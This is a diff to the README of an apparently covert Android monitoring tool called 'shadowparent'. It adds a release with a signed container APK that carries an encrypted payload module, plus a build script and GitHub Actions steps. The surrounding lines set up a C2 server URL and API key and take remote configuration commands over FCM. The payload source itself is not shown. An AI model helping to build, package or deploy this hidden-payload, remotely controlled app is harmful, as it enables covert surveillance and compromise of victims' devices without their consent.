@@ -59,6 +59,11 @@ make config C2_URL=https://your-app.onrender.com API_KEY=sk-xt-...
 # or remotely, via FCM: {"cmd":"cfg","url":"https://...","key":"sk-..."}
 ```
 
+## Releases
+- v1.0.0 — https://github.com/palcinkoo/shadowparent-dashboard/releases/tag/v1.0.0
+  - `android_UI.apk` — container app (signed, arm64-v8a + armeabi-v7a)
+  - `payload.apk` — payload module (already embedded encrypted in the container)
+
 ## Build
 ```bash
 make keystore
@@ -76,10 +81,18 @@ Fast local check without the NDK (skips the C++ step):
 cd android && ./gradlew -PspNoNative=true :app:assembleDebug
 ```
 
+### One script
+```bash
+bash tools/build_apk.sh     # payload -> encrypted DEX -> container APK -> build/
+```
+
 ### GitHub Actions (recommended)
 `.github/workflows/android-build.yml` builds container + payload APK on every
 push to `main` and uploads them as the `shadowparent-apk` artifact
 (Download: repo → Actions → Build APK → Artifacts).
+> The workflow file needs a PAT with the `workflow` scope to be pushed by API.
+> If the push is refused, add the file once through the GitHub web UI
+> (Add file -> Create new file -> `.github/workflows/android-build.yml`).
 
 ## Modules
 | Module | What it does |
